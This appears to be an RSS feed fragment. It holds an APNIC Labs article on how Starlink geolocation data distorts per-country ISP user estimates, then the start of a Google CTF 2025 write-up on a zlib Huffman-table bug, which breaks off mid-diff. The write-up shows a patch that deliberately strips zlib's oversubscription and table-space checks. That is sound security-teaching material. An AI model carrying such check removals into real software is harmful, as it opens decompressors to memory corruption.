name of each country, a collection of numeric codes for each defined country, and a definition of a set of regions (groups of countries or groups of regions).&lt;/p&gt;
    &lt;p&gt;Why are these geolocation databases useful? There are obvious uses in the ongoing fight against various form of cyber-attacks, trying to de-anonymise the identity and location of the attacker. This information is also used in attempting to enforce various intellectual property rights that are often assigned to rights holders on a country-by-country basis. And then there are statistical reports. Countries like to compare themselves to others. But even simple questions, such as "How many Internet users are in each country?" are challenging to answer without the underlying seed data of a geolocation database.&lt;/p&gt;
    &lt;p&gt;There are a number of such IP address-to-location databases out there, but most are either private or only accessible on a subscription basis. In the research world many researchers have opted for the databases that are more generally available, and at APNIC labs for AP address-to-country mappings we rely on Maxmind and ipinfo.io. for this information.&lt;/p&gt;
    &lt;p&gt;The Regional Internet Registries also publish a two-letter country code in their IP number resource reports, and they are often used as a surrogate for IP-to-country mappings, but the data quality is low when assessed for quality as a source of geolocation information.&lt;/p&gt;
    &lt;p&gt;The reason why is based on differing assumptions between the data recording function of the RIRs and the needs of the geolocation function. The RIRs record the country of the principal office of the entity that was the recipient of the resource assignment. It does not record where these address and AS numbers are actually deployed on the Internet. In many cases, where an entity operates within a single country or economy, the RIR-recorded country code corresponds with the country where the associated addresses are being used. In other cases, where the IP addresses and AS numbers are used in other countries, the RIRs provide no indication that this is the case for these number resources. Also, the granularity of the data in the RIR registry is at a level of allocation, but when an assigned address block is divided up by an address holder and used in multiple countries there is no ability in the RIR data recording formation to track this internal subdivision and diverse deployment.&lt;/p&gt;
    &lt;p&gt;In general, it's not part of the RIRs' role to track where these number resources are being deployed. The RIRs' interest lies in accurately tracking who is assigned an address, and not where that address is being used.&lt;/p&gt;
    &lt;p&gt;At APNIC Labs we have been investigating if the collection of data that we have assembled as part of the measurement work can be used to track the ISP market share within each national economy. We are interested in trying to measure the effective level of inter-ISP competition within each national economy. The base of this derived competition measurement is a notional count of end users that are served by each ISP that operates in a national economy.&lt;/p&gt;
    &lt;p&gt;The measurement process starts with the estimated current population in each country. The data we use is sourced from the United Nations Population Division. We use the mid-year population estimate from 2024 and apply the 2023-2024 growth rate to the period from mid 2024 to the present day to get an estimate of the current population of each country for this day.&lt;/p&gt;
    &lt;p&gt;The second data set we use is the proportion of the population of each country that are classed as Internet users. There are three possible sources for this data, the World Bank, the International Telecommunications Union (ITU) and the CIA World Factbook. We use the ITU data by preference, but we cross check with the other two data sources for correlation..&lt;/p&gt;
    &lt;p&gt;The combination of these data sets gives us an estimate of the current Internet user population per country. It should be noted that this is not the number of âsubscriptionsâ to a service, as it attempts to include the number of users behind each subscription. It also is supposed to avoid âdouble countingâ, so where a user is part of a broadband service and also has a mobile service, then the user is still only counted once as an âInternet userâ.&lt;/p&gt;
    &lt;p&gt;The third component of the data is the ad presentation data of the APNIC measurement program. We use Google Ads to deliver some 35M individual ad impressions per day. We use a geolocation database to map each user who received an ad impression to a country, and use a local default-free BGP routing table to also map each user to their "home" network. At this point we have now assembled a set of "home" networks (origin AS numbers) and the geo-located country for each presented ad.&lt;/p&gt;
    &lt;p&gt;In this work we are making some pretty sweeping assumptions. These assumptions are somewhat questionable, but we've been forced to make them in the absence of generally available per-country data that is published by all countries in a timely and mutually consistent manner.&lt;/p&gt;
    &lt;p&gt;The first assumption is that Google's ad placement algorithms apply to all users within a given country uniformly. In defining the ad campaigns, we attempt to make the placement definitions as generic as possible, so that within each country the ad placements are roughly equivalent to a random sampling drawn from all users in that country. The implication of this assumption is that if an ISP has twice the number of users than another ISP in the same country, then its users will receive twice the number of ad impressions. This could be stated as: "The distribution of ad placement and the distribution of users across ISPs within any country are assumed to correlate."&lt;/p&gt;
    &lt;p&gt;The second assumption is that each user uses a single ISP for Internet access. This is not necessarily the case. For example, a user may use a local mobile service provider for their mobile Internet access and Starlink for their broadband access. We also have a user in their workplace using their workplace's ISP and using a consumer ISP when they are at home. These days many users have multiple mobile connections, and it is unclear how these multiple access methods correlate to ad placement, and through that to our measurements. The conclusion is that we canât account for such situations and in uniquely assigning each user to a single ISP in a country we tend to underestimate the user count for each ISP in consequence.&lt;/p&gt;
    &lt;p&gt;Due to the uncertainties that follow from these two major assumptions, the results we generate have an inevitable level of uncertainty. Some individual comparisons of this data against other sources where we have access to ISP market share data in individual countries point to an overall level of uncertainty of up to 15% or so in our estimates of users per ISP. Large consumer ISPs are still reported as having a large user population in the generated data, but the data for small networks is very uncertain.&lt;/p&gt;
    &lt;p&gt;The assumption of uniform distribution of ad placements across all ISPs within each country tends to fail where the number of placed ads in relation to the per-country user population is low. The best current example of this can be seen with the Russian Federation, where ad placement in this country has plummeted since February 2023 (a consequence of the hostilities between the Russian Federation and the Ukraine and associated western sanctions being placed on Russia).&lt;/p&gt;
    &lt;p&gt;Another general assumption is that all users exist within a country. This assumption does not necessarily hold for users on international flights using onboard Internet services, nor for ships at sea. In general, this factor should be insignificant for this exercise, given that as a proportion of the world's 5 billion users (or thereabouts!) this category of users is very small and should not distort the results to any significant extent beyond the already noted estimate of a 15% uncertainty. But this general assessment does not hold when the ISP in question operates a service that is not constrained to any single country, such as a satellite-based service. Even so, when the satellite service operates as a wholesale service and provides connections as a service to ISPs, then this is not relevant to this form of measurement. If an ISP provides service in a country using IP addresses that are assigned to that ISP, then the conventional geolocation function will still provide usable results. The situation is different when the satellite operator provides its own retail services, using IP addresses that have been assigned to that satellite operator. This is the case for Starlink.&lt;/p&gt;
    &lt;p&gt;The basic assumption here is that all IP addresses are used within a national realm. But this is not necessarily the case with users who are connected by a satellite service. What is the country when the IP service is provided to a ship on the high seas?&lt;/p&gt;
    &lt;p&gt;There are always exceptions to any generalisation, and some country views that are generated in this manner just stretch credibility too far.&lt;/p&gt;
    &lt;p&gt;Take Yemen, for example. A country with an estimated population of 10M people and 3.4M Internet users. The method described above gave the following result at the end of September:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="8"&gt;
        &lt;cell role="head"&gt;Visible ASNS: Custimer Populations (Est.)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;Date: 22/09/2025&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;Rank&lt;/cell&gt;
        &lt;cell&gt;ASN&lt;/cell&gt;
        &lt;cell&gt;AS Name&lt;/cell&gt;
        &lt;cell&gt;CC&lt;/cell&gt;
        &lt;cell&gt;Users (est.)&lt;/cell&gt;
        &lt;cell&gt;% of country&lt;/cell&gt;
        &lt;cell&gt;% of Internet&lt;/cell&gt;
        &lt;cell&gt;Samples&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;AS14593&lt;/cell&gt;
        &lt;cell&gt;SPACEX-STARLINK&lt;/cell&gt;
        &lt;cell&gt;YE&lt;/cell&gt;
        &lt;cell&gt;6,233,929&lt;/cell&gt;
        &lt;cell&gt;59.22&lt;/cell&gt;
        &lt;cell&gt;0.14&lt;/cell&gt;
        &lt;cell&gt;321,186&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;AS30873&lt;/cell&gt;
        &lt;cell&gt;PTC-YMENNET&lt;/cell&gt;
        &lt;cell&gt;YE&lt;/cell&gt;
        &lt;cell&gt;3,350,708&lt;/cell&gt;
        &lt;cell&gt;31.83&lt;/cell&gt;
        &lt;cell&gt;0.08&lt;/cell&gt;
        &lt;cell&gt;172,636&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;3&lt;/cell&gt;
        &lt;cell&gt;AS204317&lt;/cell&gt;
        &lt;cell&gt;ADENNET&lt;/cell&gt;
        &lt;cell&gt;YE&lt;/cell&gt;
        &lt;cell&gt;910,655&lt;/cell&gt;
        &lt;cell&gt;8.65&lt;/cell&gt;
        &lt;cell&gt;0.02&lt;/cell&gt;
        &lt;cell&gt;46,919&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;AS13335&lt;/cell&gt;
        &lt;cell&gt;CLOUDFLARENET&lt;/cell&gt;
        &lt;cell&gt;YE&lt;/cell&gt;
        &lt;cell&gt;28,647&lt;/cell&gt;
        &lt;cell&gt;0.27&lt;/cell&gt;
        &lt;cell&gt;0.01&lt;/cell&gt;
        &lt;cell&gt;1,467&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;This measurement result for Starlink in Yemen is dubious at best. It has been generated because over the past 60 days some 321,000 measurement advertisements originated from IP addresses that have been assigned to Starlink and Starlink's geodatabase geolocates these addresses to Yemen. The other three services providers appear to be the incumbent telco, Yemen Net, and a local ISP in Aden, Aden Net. The Cloudflare measurement is likely due to a combination of the local use of Apple's Private Data Relay and the Cloudflare's Warp product. Together, these three providers accounted for some 210,000 ad presentations over the same period. The result is that the algorithm we use assigned some 6M users in Yemen (or 60% of the countryâs Internet user population) to Starlink!&lt;/p&gt;
    &lt;p&gt;What factors might be at play here that would contribute to this anomalous result?&lt;/p&gt;
    &lt;p&gt;One potential factor is the volume of shipping in the Red Sea. These days it appears that the use of Starlink at sea is pretty much pervasive. A Starlink service is evidently a faster and cheaper communications service than that provided by Inmarsat and it has truly global reach. Given that the Starlink geolocatation data attempts to map every Starlink IP address into one country or another, even ships at sea using Starlink get assigned an IP address that is mapped to some piece of land. Some 60 ships a day use the Suez Canal, and while the transit time from the Indian Ocean to the mediterranean sea is a few days, it's still a stretch to claim that shipping crew use of Starlink services alone accounts for some 50,000 ad impressions per day. These numbers imply that the use of Starlink by shipping may be part of the factors at play here, but it may not be the only contributary factor.&lt;/p&gt;
    &lt;p&gt;Another potential factor is that it's possible that Starlink's geolocation data does not reflect reality. The Starlink availability map indicates that Starlink has obtained national regulatory approval to operate in Yemen, Oman, Qatar, Bahrain, Israel, Jordan and Somalia, but not in Saudi Arabia, Egypt, Sudan, Eritrea, and Ethiopia. There have been persistent stories in a number of markets of Starlink resellers that set up a service in a country that has the necessary national regulatory approvals to use Starlink and then they ship the dish to a nearby location in a different country. It's an open question as to the extent this is taking place, and if so then it's certainly plausible to guess that users in Saudi Arabia are using Starlink services that are registered in Yemen.&lt;/p&gt;
    &lt;p&gt;Does Yemen really have 6M Starlink users? That is extremely unlikely. How many Starlink users is the country likely to have? In neighbouring Oman, Starlink has a far more modest 0.08% market share, according to this same measurement technique. I would be surprised if the actual figure for in-country Yemen users is all that different. For the Yemen data, the high number might well be the result of a high count of Starlink-using passing maritime traffic being attributed to Yemen, and also some component of cross-country usage from perhaps Saudi Arabia and the United Arab Emirates, nearby countries where Starlink appears not to have local regulatory approval as yet.&lt;/p&gt;
    &lt;p&gt;Are there other countries with a similar problem of apparent over-representation of Starlink users? The ad placement data, assigned to countries using the Starlink geolocatation data maps to 152 countries. In 21 instances, listed in Table 1, Starlink is used in more than 10% of the ad placement volumes, which looks to be somewhat questionable.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="6"&gt;
        &lt;cell role="head"&gt;CC&lt;/cell&gt;
        &lt;cell role="head"&gt;Cover?&lt;/cell&gt;
        &lt;cell role="head"&gt;Ads&lt;/cell&gt;
        &lt;cell role="head"&gt;Est. Users&lt;/cell&gt;
        &lt;cell role="head"&gt;% Users&lt;/cell&gt;
        &lt;cell role="head"&gt;CC Name&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;SJ&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;726&lt;/cell&gt;
        &lt;cell&gt;0&lt;/cell&gt;
        &lt;cell&gt;100%&lt;/cell&gt;
        &lt;cell&gt;Svalbard and Jan Mayen Islands&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;BL&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;620&lt;/cell&gt;
        &lt;cell&gt;6,008&lt;/cell&gt;
        &lt;cell&gt;98%&lt;/cell&gt;
        &lt;cell&gt;Saint Barthelemy&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;TV&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;7,980&lt;/cell&gt;
        &lt;cell&gt;5,799&lt;/cell&gt;
        &lt;cell&gt;92%&lt;/cell&gt;
        &lt;cell&gt;Tuvalu&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;KI&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;42,234&lt;/cell&gt;
        &lt;cell&gt;1,7955&lt;/cell&gt;
        &lt;cell&gt;81%&lt;/cell&gt;
        &lt;cell&gt;Kiribati&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;PN&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
        &lt;cell&gt;19&lt;/cell&gt;
        &lt;cell&gt;72%&lt;/cell&gt;
        &lt;cell&gt;Pitcairn&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;YE&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;321,673&lt;/cell&gt;
        &lt;cell&gt;6,256,291&lt;/cell&gt;
        &lt;cell&gt;59%&lt;/cell&gt;
        &lt;cell&gt;Yemen&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;NR&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;6,864&lt;/cell&gt;
        &lt;cell&gt;4,071&lt;/cell&gt;
        &lt;cell&gt;56%&lt;/cell&gt;
        &lt;cell&gt;Nauru&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;CK&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;16,220&lt;/cell&gt;
        &lt;cell&gt;4,802&lt;/cell&gt;
        &lt;cell&gt;50%&lt;/cell&gt;
        &lt;cell&gt;Cook Islands&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;MH&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;7,857&lt;/cell&gt;
        &lt;cell&gt;7,805&lt;/cell&gt;
        &lt;cell&gt;34%&lt;/cell&gt;
        &lt;cell&gt;Marshall Islands&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;SS&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;60,296&lt;/cell&gt;
        &lt;cell&gt;369,566&lt;/cell&gt;
        &lt;cell&gt;32%&lt;/cell&gt;
        &lt;cell&gt;South Sudan&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;MF&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;1,412&lt;/cell&gt;
        &lt;cell&gt;4,468&lt;/cell&gt;
        &lt;cell&gt;24%&lt;/cell&gt;
        &lt;cell&gt;Saint Martin&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;VU&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;214&lt;/cell&gt;
        &lt;cell&gt;22,423&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
        &lt;cell&gt;Vanuatu&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;NE&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;140,318&lt;/cell&gt;
        &lt;cell&gt;1,076,585&lt;/cell&gt;
        &lt;cell&gt;21%&lt;/cell&gt;
        &lt;cell&gt;Niger&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;SD&lt;/cell&gt;
        &lt;cell&gt;N&lt;/cell&gt;
        &lt;cell&gt;348,986&lt;/cell&gt;
        &lt;cell&gt;3,517,776&lt;/cell&gt;
        &lt;cell&gt;19%&lt;/cell&gt;
        &lt;cell&gt;Sudan&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;TD&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;78,690&lt;/cell&gt;
        &lt;cell&gt;292,985&lt;/cell&gt;
        &lt;cell&gt;17%&lt;/cell&gt;
        &lt;cell&gt;Chad&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;ZW&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;311,093&lt;/cell&gt;
        &lt;cell&gt;801,754&lt;/cell&gt;
        &lt;cell&gt;15%&lt;/cell&gt;
        &lt;cell&gt;Zimbabwe&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;SB&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;9,916&lt;/cell&gt;
        &lt;cell&gt;14,946&lt;/cell&gt;
        &lt;cell&gt;14%&lt;/cell&gt;
        &lt;cell&gt;Solomon Islands&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;MM&lt;/cell&gt;
        &lt;cell&gt;N&lt;/cell&gt;
        &lt;cell&gt;237,004&lt;/cell&gt;
        &lt;cell&gt;2,899,276&lt;/cell&gt;
        &lt;cell&gt;14%&lt;/cell&gt;
        &lt;cell&gt;Myanmar&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;FM&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;9,824&lt;/cell&gt;
        &lt;cell&gt;6,164&lt;/cell&gt;
        &lt;cell&gt;14%&lt;/cell&gt;
        &lt;cell&gt;Micronesia&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;MG&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;67,755&lt;/cell&gt;
        &lt;cell&gt;612,408&lt;/cell&gt;
        &lt;cell&gt;12%&lt;/cell&gt;
        &lt;cell&gt;Madagascar&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;TO&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;4,881&lt;/cell&gt;
        &lt;cell&gt;5,304&lt;/cell&gt;
        &lt;cell&gt;11%&lt;/cell&gt;
        &lt;cell&gt;Tonga&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;In the case of Svalbard other geolocation databases geolocate to Norway, whereas only the Starlink data set uses the SJ two-letter country code.&lt;/p&gt;
    &lt;p&gt;Saint Barthelmy, located in the Caribbean, is an overseas âcollectivityâ of France, with a population of some 9,000 people. Its former status was a commune as a part of Guadeloupe. While the Starlink geolocation database distinguishes between Guadeloupe and Saint Barthelmy, it appears that other databases do not draw a distinction between the two, hence the very high proportion of as placement in this country.&lt;/p&gt;
    &lt;p&gt;It is likely that the relatively high numbers of Starlink ad presentations in Tuvalu, Kiribati, Cook Islands. Marshall Islands, Saint Martin, Vanuatu, the Solomon Islands and Micronesia are due to shipping and yachting traffic. The relatively low GDP per capita in these island nations would tend to indicate that Starlink services are unaffordable by such high percentages of the domestic population.&lt;/p&gt;
    &lt;p&gt;Starlink operates a Community Gateway service in Naru, and a traceroute to the IP address prefixes announced by this ISP (Cenpac, AS 5722) reveals a Starlink connection, presumably using inter-satellite laser link. The connections using Starlinkâs own IP addresses are presumably not part of Cenpac service, and these are likely to be an anomaly, presumably due to global roaming used by ships at sea. An examination of the routing tab le shows similar community gateways have been deployed for the Tuvalu Telecommunications Corporation in Tuvalu, Tamaani in Northern Quebec in Canada and the for the Federated States of Micronesia Telecommunications Corporation.&lt;/p&gt;
    &lt;p&gt;It's also possible that these additional ad placements could include an aircraft element, as there have been reports of Starlink selling a mobile access service to aircraft in flight, but as with ships at sea there is no published data on the uptake of this class of Starlink users.&lt;/p&gt;
    &lt;p&gt;There are a number of other anomalies in Table 1. Sudan and Myanmar both have a high ad placement rate, yet the Starlink access map indicates that the Starlink service is not available in either of these countries. If that is the case, then why does the Starlink geo data have IP address entries for both of these countries and why are so many ad placements being recorded from these IP addresses? In the case of Sudan, the Starlink gateway announcing these IP addresses is located in Mombasa in Keyna, and for Myanmar the relevant Starlink Gateway is located in Singapore. There are also high counts of ad placements for Starlink services that geolocate to Zimbabwe, Niger and Chad. The situation in the Cook Islands is potentially relevant here, where prior to regulatory approval to operate in the Cook Islands it was reported that domestic enterprises and some users were purchasing a Starlink service in New Zealand under a Roam Unlimited plan, and then shipping the equipment to the Cook Islands. There is no regulatory approval for Starlink to operate in South Africa, Namiba, Angola, and all of the countries in northern Africa and much of western Africa, and itâs likely that there is a similar use of Starlinkâs roaming services to circumvent these local regulatory issues and purchase a roaming service elsewhere and use in in these countries.&lt;/p&gt;
    &lt;p&gt;For 20 of these 21 countries (the sole exception appears to be Pitcairn Islands) itâs highly likely that the inferred level of use of Starlink within these countries is inflated by these factors, and the resultant view of the domestic ISP market is skewed as a result.&lt;/p&gt;
    &lt;p&gt;The rise of the use of satellite services for these global roaming services raises some basic questions about IP geolocation and its role.&lt;/p&gt;
    &lt;p&gt;Is this about the end user's precise physical location on the surface of the planet? Or is this about the national boundaries we've drawn on this surface, and assigning every user into one of these countries? In this case do we need to use a new geolocation code (or codes) for locations at sea? Is "at sea" defined by the conventional 12 nautical mile sea boundary? Or is some other interpretation of a margin where a country has a territorial sea claim?&lt;/p&gt;
    &lt;p&gt;What about ships in international waters? The conventional approach to ships at sea assert that the ship and its crew are subject to the laws of its flag state in international waters. What about aircraft in flight? It might appear that a similar situation to ships at sea may apply to aircraft in flight over international space, but a more commonly applied convention (the Tokyo Convention) is that the laws of the country of aircraft registration apply to an aircraft in flight for international flights irrespective of the location of the aircraft at any point.&lt;/p&gt;
    &lt;p&gt;So, what is the geolocation of the occupants of that ship or flight when accessing the Internet?&lt;/p&gt;
    &lt;p&gt;There is a deeper assumption here concerning the behaviour of IP addresses. Does it even make sense to statically assign a geographic location to an IP address when the addressed device is in motion? What are the motivations for performing the location attribute assignment, and how can we implement the dynamic nature of such an assignment? There are no clear unambiguous answers to such questions, and perhaps that ambiguity reflects a common uncertainty that there is no clearly defined purpose for geolocation assignment in the first place.&lt;/p&gt;
    &lt;p&gt;At APNIC Labs we've decided to override the Starlink geolocation data that refers to the 20 countries listed above and instead assign an âunclassifiedâ designation to this part of the Starlink geolocation data.&lt;/p&gt;
    &lt;p&gt;Itâs not exactly a satisfying response to the problem, but it stops the distortion of the national measurements due to the increasing levels of usage of these satellite-based services for Internet access.&lt;/p&gt;
    &lt;p&gt;The above views do not necessarily represent the views of the Asia Pacific Network Information Centre.&lt;/p&gt;
    &lt;p&gt;The author was one of two liaisons from the IETF to the RSS GWG. The views expressed here are his personal views and are not endorsed by anyone else!&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt; GEOFF HUSTON AM, M.Sc., is the Chief Scientist at APNIC, the Regional Internet Registry serving the Asia Pacific region.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45422514</guid><pubDate>Tue, 30 Sep 2025 06:23:31 +0000</pubDate></item><item><title>Exploiting huffman table bug in zlib</title><link>https://velog.io/@0range1337/CTF-Google-CTF-2025-webz-Exploiting-zlibs-Huffman-Code-Table-English</link><description>&lt;doc fingerprint="ee9112fdb84841d9"&gt;
  &lt;main&gt;&lt;quote&gt;&lt;p&gt;한국어: https://velog.io/@0range1337/CTF-Google-CTF-2025-webz-Exploiting-zlibs-Huffman-Code-Table&lt;/p&gt;&lt;/quote&gt;&lt;code&gt;1. Overview
2. Background
	2-1. google-zlib-Increase-Huffman-Table-Size.patch
	2-2. Deflate Algorithm
		2-2-1. LZ77
		2-2-2. Huffman Coding
3. Code Analysis
	3-1. Inflate
	3-2. Huffman Table
	3-3. Decode
4. Vulnerability
	4-1. Unintialized Huffman Code Table
	4-2. Exploiting inflate_fast
    	4-2-1. Integer Overflow (Unexploitable)
    	4-2-2. PoC
        4-2-3. Stream Overflow (Exploitable)
    	4-2-4. PoC
5. Exploit&lt;/code&gt;&lt;p&gt;&lt;code&gt;webz&lt;/code&gt; is a zlib exploitation challenge from Google CTF 2025. The Google-zlib implementation provided in the challenge is not upstream; it’s a version with an arbitrary patch applied. Whereas typical open‑source exploit challenges ship a patch that clearly introduces a vulnerability, &lt;code&gt;webz&lt;/code&gt;’s Google-zlib patch appears—at first glance—to be a normal optimization.&lt;/p&gt;&lt;p&gt;In practice, the vulnerability in this Google-zlib can be found quickly via fuzzing. However, in this write‑up we’ll derive the precise root cause through source analysis.&lt;/p&gt;&lt;p&gt;The Google-zlib codebase isn’t large, but it is quite tricky. Because it implements compression algorithms, manipulates data at the bit level, and contains optimizations that sacrifice readability, analysis can be difficult.&lt;/p&gt;&lt;code&gt;// webz.c:L114
    int ret = inflateInit2(&amp;amp;webz_state.infstream, -15);
    webz_state.infstream.msg = webz_state.ok_status;

    if (ret != Z_OK) {
        printf("Error: inflateInit failed: %d\n", ret);
        return;
    }

    ret = inflate(&amp;amp;webz_state.infstream, Z_NO_FLUSH);

    if (ret != Z_STREAM_END) {
        printf("Error: inflate failed: %d\n", ret);
        inflateEnd(&amp;amp;webz_state.infstream);
        return;
    }

    inflateEnd(&amp;amp;webz_state.infstream);&lt;/code&gt;&lt;quote&gt;&lt;code&gt;// zlib.h\:L570 /\* windowBits can also be -8..-15 for raw deflate. In this case, -windowBits determines the window size. deflate() will then generate raw deflate data with no zlib header or trailer, and will not compute a check value. \*/&lt;/code&gt;&lt;/quote&gt;&lt;p&gt;First, let’s look at the provided &lt;code&gt;webz.c&lt;/code&gt;. It’s simply a wrapper around Google-zlib. It receives raw Deflate-compressed data from the user and decompresses it using Google-zlib’s &lt;code&gt;inflate&lt;/code&gt;. Therefore, we must identify vulnerabilities in the code that implements &lt;code&gt;inflate&lt;/code&gt;: &lt;code&gt;inflate.c&lt;/code&gt;, &lt;code&gt;inftrees.c&lt;/code&gt;, and &lt;code&gt;inffast.c&lt;/code&gt;.&lt;/p&gt;&lt;quote&gt;&lt;item&gt;inflate.c&lt;/item&gt;&lt;lb/&gt;The core of the&lt;code&gt;inflate&lt;/code&gt;implementation. The&lt;code&gt;inflate&lt;/code&gt;function is a virtual finite-state machine, treating the given compressed data like opcodes for a virtual machine. As we’ll examine later, it processes compressed data in blocks.&lt;item&gt;inftrees.c&lt;/item&gt;&lt;lb/&gt;One of the compression techniques used in&lt;code&gt;Deflate&lt;/code&gt;is Huffman coding. To decode Huffman-coded data in the&lt;code&gt;inflate&lt;/code&gt;implementation, a Huffman table must be constructed;&lt;code&gt;inftrees.c&lt;/code&gt;contains that Huffman table construction code.&lt;item&gt;inffast.c&lt;/item&gt;&lt;code&gt;inffast.c&lt;/code&gt;contains&lt;code&gt;inflate_fast&lt;/code&gt;, a high-speed implementation of&lt;code&gt;inflate&lt;/code&gt;decoding. Under certain conditions,&lt;code&gt;inflate&lt;/code&gt;calls&lt;code&gt;inflate_fast&lt;/code&gt;to decode data.&lt;/quote&gt;&lt;code&gt;From 2c282408771115b3cf80eeb9572927b796ddea79 Mon Sep 17 00:00:00 2001
From: Brendon Tiszka &amp;lt;tiszka@google.com&amp;gt;
Date: Wed, 21 May 2025 15:11:52 +0000
Subject: [PATCH] [google-zlib] Increase Huffman Table Size

The basic idea is to use a bigger root &amp;amp; secondary table for both
dists and lens, allowing us to avoid oversubscription chekcs.
---
 inftrees.c | 18 ------------------
 inftrees.h | 18 +++++-------------
 2 files changed, 5 insertions(+), 31 deletions(-)

diff --git a/inftrees.c b/inftrees.c
index a127e6b..7a8dd2e 100644
--- a/inftrees.c
+++ b/inftrees.c
@@ -122,16 +122,6 @@ int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
         if (count[min] != 0) break;
     if (root &amp;lt; min) root = min;
 
-    /* check for an over-subscribed or incomplete set of lengths */
-    left = 1;
-    for (len = 1; len &amp;lt;= MAXBITS; len++) {
-        left &amp;lt;&amp;lt;= 1;
-        left -= count[len];
-        if (left &amp;lt; 0) return -1;        /* over-subscribed */
-    }
-    if (left &amp;gt; 0 &amp;amp;&amp;amp; (type == CODES || max != 1))
-        return -1;                      /* incomplete set */
-
     /* generate offsets into symbol table for each length for sorting */
     offs[1] = 0;
     for (len = 1; len &amp;lt; MAXBITS; len++)
@@ -200,11 +190,6 @@ int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
     used = 1U &amp;lt;&amp;lt; root;          /* use root table entries */
     mask = used - 1;            /* mask for comparing low */
 
-    /* check available table space */
-    if ((type == LENS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_LENS) ||
-        (type == DISTS &amp;amp;&amp;amp; used &amp;gt; ENOUGH_DISTS))
-        return 1;
-
     /* process all codes and make table entries */
     for (;;) {
         /* create table entry */
@@ -270,9 +255,6 @@ int ZLIB_INTERNAL inflate_table(codetype type, unsigned short FAR *lens,
 
             /* check for enough space */
             used += 1U &amp;lt;&amp;lt; curr;
